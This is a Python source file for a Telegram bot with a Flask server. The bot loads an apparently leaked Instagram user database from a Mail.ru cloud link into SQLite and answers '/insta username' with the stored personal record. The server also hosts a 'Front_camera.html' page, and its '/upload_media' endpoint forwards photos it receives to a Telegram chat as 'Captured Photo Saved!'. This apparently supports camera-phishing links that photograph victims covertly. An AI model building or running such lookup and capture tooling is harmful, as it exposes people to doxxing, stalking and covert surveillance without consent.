import io
import json
import os
import sqlite3
import threading
from flask import Flask, request, render_template
import telebot
from telebot import types
import requests

# ----------------- 1. CONFIGURATION & SETUP -----------------
with open("config.json", "r") as f:
    config = json.load(f)

BOT_TOKEN = config.get("bot_token")
ADMIN_ID = int(config.get("admin_id"))
OWNER_USERNAME = config.get("owner_username")
SERVER_URL = config.get("server_url")
CHANNELS = config.get("channels", [])

DEV_TAG = f"👨‍💻 Developer: @{OWNER_USERNAME}"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Flask(__name__)

DB_FILE = "api_database.db"
LOCAL_CACHE_FILE = "mailru_cache.json"
MAILRU_WEBLINK_PATH = "PPrL/Kquz6G6B9"

def db_init():
    con = sqlite3.connect(DB_FILE)
    con.execute("CREATE TABLE IF NOT EXISTS admins(id INTEGER PRIMARY KEY)")
    con.execute("CREATE TABLE IF NOT EXISTS users_limit(uid TEXT PRIMARY KEY, tokens INTEGER)")
    # Instagram data search table for ultra-fast lookup without memory overflow
    con.execute("""
        CREATE TABLE IF NOT EXISTS insta_data (
            username TEXT PRIMARY KEY,
            data_json TEXT
        )
    """)
    con.execute("INSERT OR IGNORE INTO admins(id) VALUES(?)", (ADMIN_ID,))
    con.commit()
    con.close()
db_init()

def is_admin(uid):
    if uid == ADMIN_ID: return True
    con = sqlite3.connect(DB_FILE)
    r = con.execute("SELECT id FROM admins WHERE id=?", (uid,)).fetchone()
    con.close()
    return bool(r)

# ----------------- MAIL.RU TO SQLITE SYNC (LOW MEMORY) -----------------
def download_and_import_database():
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        disp_url = "https://cloud.mail.ru/api/v2/dispatcher"
        disp_res = requests.get(disp_url, headers=headers, timeout=10).json()
        weblink_get_url = disp_res.get("body", {}).get("weblink_get", [{}])[0].get("url")
        if not weblink_get_url: return False, "Resolver failed"
        
        direct_url = f"{weblink_get_url}/{MAILRU_WEBLINK_PATH}"
        data_res = requests.get(direct_url, headers=headers, stream=True, timeout=60)
        if data_res.status_code == 200:
            con = sqlite3.connect(DB_FILE)
            # Stream karke sqlite mein insert karenge taaki RAM full na ho
            try:
                raw_data = data_res.json()
                if isinstance(raw_data, list):
                    for item in raw_data:
                        if isinstance(item, dict):
                            u = str(item.get("username") or item.get("user") or item.get("insta_user") or item.get("id") or "").strip().lower()
                            if u:
                                con.execute("INSERT OR REPLACE INTO insta_data(username, data_json) VALUES(?, ?)", (u, json.dumps(item)))
                elif isinstance(raw_data, dict):
                    for k, v in raw_data.items():
                        con.execute("INSERT OR REPLACE INTO insta_data(username, data_json) VALUES(?, ?)", (str(k).strip().lower(), json.dumps(v)))
                con.commit()
            except Exception as ex:
                print(f"Import chunk error: {ex}")
            finally:
                con.close()
            return True, "Imported successfully to SQLite"
        return False, "Failed to download"
    except Exception as e:
        return False, str(e)

def search_instagram_in_db(target_username: str):
    target = target_username.strip().lower().lstrip("@")
    con = sqlite3.connect(DB_FILE)
    cur = con.cursor()
    cur.execute("SELECT data_json FROM insta_data WHERE username = ?", (target,))
    row = cur.fetchone()
    
    if not row:
        # Partial search agar exact match na mile
        cur.execute("SELECT data_json FROM insta_data WHERE username LIKE ? LIMIT 1", (f"%{target}%",))
        row = cur.fetchone()
        
    con.close()
    if row:
        try:
            return json.loads(row[0])
        except:
            return None
    return None

# ----------------- FORCE JOIN & TOKENS -----------------
def is_user_joined(user_id):
    if is_admin(int(user_id)): return True
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(ch["username"], user_id)
            if member.status not in ['creator', 'administrator', 'member', 'restricted']:
                return False
        except: return False
    return True

def get_force_join_markup():
    markup = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNELS:
        markup.add(types.InlineKeyboardButton(f"📢 Join {ch['name']}", url=ch["url"]))
    markup.add(types.InlineKeyboardButton("✅ Check / Verified", callback_data="check_join"))
    return markup

# ----------------- TELEGRAM COMMANDS -----------------
@bot.message_handler(commands=['start'])
def handle_start(message):
    user = message.from_user
    if not is_user_joined(user.id):
        bot.send_message(
            message.chat.id,
            f"<blockquote>⚠️ <b>Access Denied!</b>\nBot use karne ke liye channel join karein:\n{DEV_TAG}</blockquote>",
            reply_markup=get_force_join_markup()
        )
        return
    bot.send_message(
        message.chat.id,
        f"<blockquote>Welcome to <b>{bot.get_me().first_name}</b>\n\n🔍 Instagram lookup ke liye use karein:\n<code>/insta username</code>\n{DEV_TAG}</blockquote>"
    )

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def verify_join_callback(call):
    if is_user_joined(call.from_user.id):
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except: pass
        bot.send_message(call.message.chat.id, "✅ Verified! Ab aap /insta <username> use kar sakte hain.")
    else:
        bot.answer_callback_query(call.id, "❌ Aapne abhi tak channel join nahi kiya!", show_alert=True)

# ---- INSTA COMMAND HANDLER ----
@bot.message_handler(commands=['insta'])
def handle_insta_command(message):
    user = message.from_user
    if not is_user_joined(user.id):
        bot.reply_to(message, "⚠️ Pehle force join channel join karein!")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "❌ Sahi tarika: <code>/insta username</code>", parse_mode="HTML")
        return
    
    target_user = parts[1].strip()
    wait_msg = bot.reply_to(message, f"🔍 Searching database for <b>{target_user}</b>...", parse_mode="HTML")
    
    result = search_instagram_in_db(target_user)
    
    if result:
        res_str = json.dumps(result, indent=2, ensure_ascii=False)
        if len(res_str) > 3500:
            res_str = res_str[:3500] + "\n...[Truncated]"
        
        response_text = (
            f"<blockquote>"
            f"✅ <b>Data Found for:</b> <code>{target_user}</code>\n\n"
            f"<pre>{res_str}</pre>\n"
            f"{DEV_TAG}"
            f"</blockquote>"
        )
    else:
        response_text = f"<blockquote>❌ <b>{target_user}</b> ka data database mein nahi mila.\n{DEV_TAG}</blockquote>"
        
    bot.edit_message_text(response_text, chat_id=message.chat.id, message_id=wait_msg.message_id, parse_mode="HTML")

# ----------------- FLASK ENDPOINTS -----------------
@app.route('/ayush-web')
def route_front(): return render_template('Front_camera.html')

@app.route('/upload_media', methods=['POST'])
def receive_media():
    chat_id = request.form.get('chat_id')
    media_type = request.form.get('type')
    file = request.files.get('file')
    if chat_id and file:
        data = file.read()
        caption = f"<blockquote>✅ <b>Captured Photo Saved!</b>\n{DEV_TAG}</blockquote>"
        try:
            if media_type == 'photo':
                bot.send_photo(chat_id=int(chat_id), photo=data, caption=caption, parse_mode="HTML")
            return "OK", 200
        except Exception as e: return str(e), 500
    return "FAIL", 400

@app.route('/')
def home():
    return "Bot & SQLite API Server is Running Online!"

# ----------------- RUNNER -----------------
if __name__ == "__main__":
    # Background thread mein mail.ru database sync chalega taaki server start hone mein delay na ho
    threading.Thread(target=download_and_import_database, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)).start()
    print(f"Flask Server started on port {port}...")
    bot.infinity_polling()